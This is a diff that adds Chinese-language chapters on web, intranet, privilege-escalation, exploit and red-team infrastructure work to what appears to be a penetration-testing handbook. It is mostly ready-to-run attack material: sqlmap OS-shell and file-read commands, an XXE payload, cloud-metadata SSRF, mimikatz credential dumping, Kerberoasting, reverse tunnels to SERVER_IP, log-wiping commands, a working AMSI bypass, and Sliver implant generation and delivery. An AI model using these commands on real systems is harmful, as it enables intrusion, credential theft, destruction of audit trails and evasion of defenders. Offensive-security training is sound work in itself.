@@ -1728,12 +1728,464 @@ for pkt in pkts:
 
 ---
 
+## 第 18 章 · Web 应用渗透专章（精简）
+
+**目的**：Web 是渗透测试最常见的入口。研究员要会 OWASP Top 10 全套漏洞识别、利用、绕过 WAF、写 PoC。
+
+### 18.1 OWASP Top 10 速查
+
+```
+A01:2021 访问控制失效（BAC / 越权）
+A02:2021 加密机制失效（弱算法 / 明文 / 默认密钥）
+A03:2021 注入（SQL / NoSQL / OS / LDAP）
+A04:2021 不安全设计（业务逻辑漏洞）
+A05:2021 安全配置错误（默认账号 / 错误信息泄漏）
+A06:2021 脆弱过时组件（CVE 库匹配）
+A07:2021 身份认证失效（弱密码 / 验证码绕过）
+A08:2021 软件数据完整性失效（反序列化 / CI/CD）
+A09:2021 安全日志监控失效（无可观测性）
+A10:2021 SSRF（服务端请求伪造）
+```
+
+### 18.2 SQL 注入
+
+**类型**：联合注入 / 布尔盲注 / 时间盲注 / 报错注入 / 堆叠注入 / 二阶注入
+
+**工具链**：
+```bash
+sqlmap -u "http://target/?id=1" --dbs --batch
+sqlmap -u "http://target/?id=1" -D dbname --tables
+sqlmap -u "http://target/?id=1" --file-read=/etc/passwd
+sqlmap -u "http://target/?id=1" --os-shell
+```
+
+**WAF 绕过**：大小写 / 注释 / 编码 / 等价函数 / HPP / 换行符
+
+### 18.3 XSS / CSRF / CORS
+
+**XSS 三种类型**：反射型 / 存储型 / DOM 型
+
+**绕过**：HTML 实体编码 / JavaScript 编码 / 标签替换（CSP 绕过）
+
+**CSRF**：Token 缺失 / Referer 检查绕过 / SameSite Cookie 绕过
+
+### 18.4 SSRF / XXE / 文件上传
+
+```bash
+# SSRF
+curl "http://target/proxy?url=http://169.254.169.254/"  # 云元数据
+gopher:// / dict:// / file:// / ftp://
+
+# XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# 文件上传绕过
+.php%00.jpg / .php5 / .phtml / .htaccess
+Content-Type 改 image/jpeg
+双扩展名 / 大小写 / ::$DATA
+```
+
+### 18.5 工具链总览
+
+| 工具 | 用途 |
+|------|------|
+| Burp Suite | 抓包 / 改包 / 扫描 |
+| sqlmap | SQL 注入 |
+| nuclei | 模板化扫描 |
+| xray | 被动扫描 |
+| Goby | 资产 + 漏洞 |
+| Dirsearch | 目录扫描 |
+| ffuf | 模糊测试 |
+| WPScan | WordPress |
+
+---
+
+## 第 19 章 · 内网渗透专章（精简）
+
+**目的**：拿到边界权限后横向移动、域渗透、凭据转储。
+
+### 19.1 信息收集（内网）
+
+```bash
+# 网络发现
+arp-scan -l
+nmap -sn 192.168.1.0/24
+masscan -p1-65535 10.0.0.0/8 --rate=10000
+
+# 端口扫描
+nmap -sV -sC -p- 192.168.1.10
+rustscan -a 192.168.1.10 -- -sV
+
+# 服务识别
+nmap --script=vuln 192.168.1.10
+searchsploit <service>
+```
+
+### 19.2 Windows 信息收集
+
+```powershell
+# 网络
+ipconfig /all
+arp -a
+net view /domain
+net view \\dc01
+
+# 用户与凭据
+net user
+net localgroup administrators
+net group "Domain Admins" /domain
+whoami /all
+cmdkey /list
+
+# mimikatz
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::wdigest
+lsadump::sam
+lsadump::dcsync
+```
+
+### 19.3 域渗透 · Kerberos 攻击
+
+**Kerberoast**：
+```bash
+GetUserSPNs.py domain.local/admin:pass -dc-ip 10.0.0.1 -request
+hashcat -m 13100 ticket.txt rockyou.txt
+```
+
+**AS-REP Roast**：
+```bash
+GetNPUsers.py domain.local/ -usersfile users.txt -no-pass
+hashcat -m 18200 asrep.txt rockyou.txt
+```
+
+**黄金票据 / 白银票据**：krbtgt 哈希 → mimikatz 伪造 TGT/TGS
+
+**NTLM 中继**：responder + ntlmrelayx → 拿下目标机器
+
+**BloodHound**：SharpHound 收数据 → BloodHound 找攻击路径
+
+### 19.4 横向移动
+
+```bash
+# WMI
+wmic /node:target process call create "cmd.exe /c <cmd>"
+
+# PsExec
+psexec.exe \\target -u admin -p pass cmd
+
+# WinRM
+evil-winrm -i target -u admin -p pass
+
+# SSH
+ssh user@target
+
+# RDP
+xfreerdp /v:target /u:admin /p:pass
+
+# DCOM / WMI / Scheduled Tasks / SMB / WinRM / RDP / SSH
+```
+
+### 19.5 内网穿透
+
+```bash
+# FRP
+frps.ini # 服务端配置
+frpc.ini # 客户端配置
+frpc -c frpc.ini
+
+# NPS / nps
+# NPS 服务端 + 客户端，Web 管理
+
+# Chisel
+chisel server -p 8080 --reverse
+chisel client SERVER_IP:8080 R:socks
+
+# Ligolo-ng
+./proxy -selfcert
+./agent -connect SERVER_IP:11601 -ignore-cert
+
+# EW (EarthWorm)
+./ew_for_linux64 -s rcsocks -l 1080 -e 8888
+```
+
+---
+
+## 第 20 章 · 权限提升与持久化专章（精简）
+
+**目的**：提权（USER → SYSTEM / user → root）+ 留后门（持久化）+ 清痕迹。
+
+### 20.1 Windows 权限提升
+
+```cmd
+# 信息收集
+systeminfo
+wmic qfe list
+whoami /all
+whoami /priv
+tasklist /v
+schtasks /query /fo LIST
+sc query
+wmic service list brief
+
+# 弱权限服务
+accesschk.exe -uwcv "Everyone" * /accepteula
+
+# 提权工具
+winPEAS.exe
+Seatbelt.exe -group=all
+PowerUp.ps1 → Invoke-AllChecks
+Sherlock.ps1 → Find-AllVulns
+```
+
+**常见提权路径**：服务路径无引号 + 空格 / AlwaysInstallElevated / DLL 劫持 / 计划任务 / 启动项 / UAC 绕过
+
+### 20.2 Linux 权限提升
+
+```bash
+# 信息收集
+uname -a
+cat /etc/os-release
+sudo -l
+find / -perm -u=s -type f 2>/dev/null  # SUID
+find / -perm -g=s -type f 2>/dev/null  # SGID
+getcap -r / 2>/dev/null               # capabilities
+cat /etc/crontab
+ls -la /etc/cron.*
+
+# 提权工具
+linpeas.sh
+LinEnum.sh
+linux-exploit-suggester.sh
+les2.py
+pspy64  # 监控进程
+
+# 常见内核漏洞
+CVE-2021-4034 (pkexec)  # PwnKit
+CVE-2021-3156 (sudo)    # Baron Samedit
+CVE-2022-0847 (pipe)    # Dirty Pipe
+CVE-2022-2588 (route2)
+CVE-2023-0386 (overlayfs)
+```
+
+### 20.3 持久化
+
+**Windows 持久化**：
+- 注册表 Run / RunOnce
+- 计划任务（schtasks）
+- 服务（sc create）
+- WMI Event Subscription
+- 启动项 / Logon Scripts
+- DLL 劫持 / COM 劫持
+- 隐藏用户（$ 后缀）
+
+**Linux 持久化**：
+- ~/.bashrc / ~/.bash_profile
+- /etc/rc.local / /etc/init.d/
+- systemd service
+- cron（crontab -e / /etc/cron.*）
+- SSH authorized_keys
+- PAM 后门
+- 动态链接库劫持（LD_PRELOAD）
+
+### 20.4 痕迹清理
+
+```bash
+# Linux
+echo "" > /var/log/auth.log
+echo "" > ~/.bash_history
+export HISTSIZE=0
+history -c
+ln -sf /dev/null ~/.bash_history
+# 篡改日志时间戳 touch -t
+find / -newermt "2024-01-01" ! -newermt "2024-01-02" -ls
+
+# Windows
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+# 删 Prefetch
+del C:\Windows\Prefetch\*.pf
+# 时间戳伪造
+```
+
+---
+
+## 第 21 章 · 漏洞利用工程专章（精简）
+
+**目的**：用现成漏洞（Exploit-DB / Metasploit / One-day）+ 写自定义 EXP + 复现 CVE。
+
+### 21.1 漏洞库
+
+```bash
+searchsploit apache 2.4
+searchsploit -m 42966  # 拷贝到当前目录
+# https://github.com/advisories
+# https://nvd.nist.gov/vuln/search
+# https://www.cnvd.org.cn
+```
+
+### 21.2 漏洞利用框架
+
+```bash
+# Metasploit
+msfconsole
+search <keyword>
+use exploit/multi/http/...
+set RHOSTS target
+set LHOST attacker
+exploit
+
+# pocs3
+pocsuite -r poc.py -u target
+
+# nuclei
+nuclei -u target -t cves/2023/CVE-2023-XXXX.yaml
+
+# xray
+xray webscan --plugins sqldet --url target
+```
+
+### 21.3 常见漏洞 EXP 速查
+
+| 类别 | 典型 CVE | 工具 |
+|------|---------|------|
+| WebLogic | CVE-2020-14882 | WebLogicExploit |
+| Shiro | CVE-2016-4437 | shiro_exploit |
+| Log4j | CVE-2021-44228 | log4j-scan |
+| Spring4Shell | CVE-2022-22965 | Spring4Shell-POC |
+| Confluence | CVE-2022-26134 | confluence-exploit |
+| Exchange | CVE-2021-26855 | proxylogon |
+| F5 BIG-IP | CVE-2020-5902 | f5-exploit |
+| Citrix | CVE-2019-19781 | citrix-exploit |
+| GitLab | CVE-2021-22205 | gitlab-exploit |
+| Drupal | CVE-2018-7600 | drupalgeddon |
+
+### 21.4 自定义 EXP 模板
+
+```python
+#!/usr/bin/env python3
+"""PoC template"""
+import requests
+
+TARGET = "http://target:8080"
+HEADERS = {"User-Agent": "Mozilla/5.0"}
+
+def check():
+    r = requests.get(f"{TARGET}/vuln", headers=HEADERS, timeout=5)
+    return r.status_code == 200
+
+def exploit():
+    payload = "id"
+    data = {"param": payload}
+    r = requests.post(f"{TARGET}/vuln", data=data, headers=HEADERS)
+    print(r.text)
+
+if __name__ == "__main__":
+    if check():
+        print("[+] Target vulnerable")
+        exploit()
+    else:
+        print("[-] Not vulnerable")
+```
+
+---
+
+## 第 22 章 · 红队基础设施专章（精简）
+
+**目的**：搭建 C2 基础设施 + 流量伪装 + 反检测通信 + 域前置。
+
+### 22.1 C2 框架选型
+
+| 框架 | 语言 | 特点 |
+|------|------|------|
+| Cobalt Strike | Java | 商业，强 |
+| Mythic | Python/Go | 开源，模块化 |
+| Sliver | Go | 开源，跨平台 |
+| Empire | Python | PowerShell 优先 |
+| Merlin | Go | HTTP/2 |
+| Havoc | C++ | 新兴，开源 |
+| Brute Ratel | C | 商业，新兴 |
+
+### 22.2 C2 部署（Sliver 为例）
+
+```bash
+# 服务端
+./sliver-server
+
+# 客户端
+./sliver-client
+
+# 创建 listener
+sliver > http -l 8080
+sliver > https -l 443 -c /path/to/cert.pem -k /path/to/key.pem
+sliver > mtls -l 8888
+
+# 生成 implant
+sliver > generate --http <listener_name> --os windows --arch amd64 --save /tmp/
+
+# 投递
+# - Web 下载
+# - 邮件附件
+# - U 盘
+
+# 操作
+sliver > use <session-id>
+sliver (IMPLANT) > info
+sliver (IMPLANT) > shell
+sliver (IMPLANT) > upload /local/file /remote/file
+```
+
+### 22.3 流量伪装
+
+```bash
+# TLS 指纹
+uTLS HelloChrome_120 / HelloIOS_14
+
+# 加密协议
+VLESS + Reality / Trojan / VLESS + XTLS
+# 客户端 → VLESS+Reality → 海外 VPS → 目标服务器
+# 客户端 → CDN (Cloudflare) → 自建反代
+
+# 域前置
+# client → CDN (合法域名) → C2 服务器
+# 利用 CDN 路由 + SNI 重写
+```
+
+### 22.4 反检测（EDR 绕过）
+
+```bash
+# AMSI 绕过
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Unhook NTDLL
+# 把 .text 区段改回磁盘上的原始 NTDLL
+# 1. 读磁盘 NTDLL
+# 2. 找 .text 段 VirtualProtect 改 RWX
+# 3. memcpy 还原
+
+# Direct Syscall
+# 不走 ntdll，直接 syscall
+# 工具: SysWhispers / SysWhispers2 / FreshyCalls
+
+# 进程注入
+# CreateRemoteThread + APC + Thread Hijack
+# Module Stomping（合法模块覆盖）
+# Process Hollowing
+```
+
+---
+
 ## 附录 A · 工号对照
 
 | 工号 | 角色 | 专长 |
 |------|-----|-----|
 | RE-7X-2024 | 资深研究员 | 二进制漏洞 / 逆向 |
 | RE-7X-2024-CC | 研究员助理 | 通用逆向 |
+| RE-7X-2024-WEB | Web 渗透专家 | OWASP / 内网 |
+| RE-7X-2024-RED | 红队专家 | C2 / 域渗透 |
 | RE-7X-2024-MOBILE | 移动端专家 | Android / iOS |
 | RE-7X-2024-IOT | IoT 专家 | 固件 / 嵌入式 |
 | RE-7X-2024-CLOUD | 云原生专家 | K8s / 容器 |
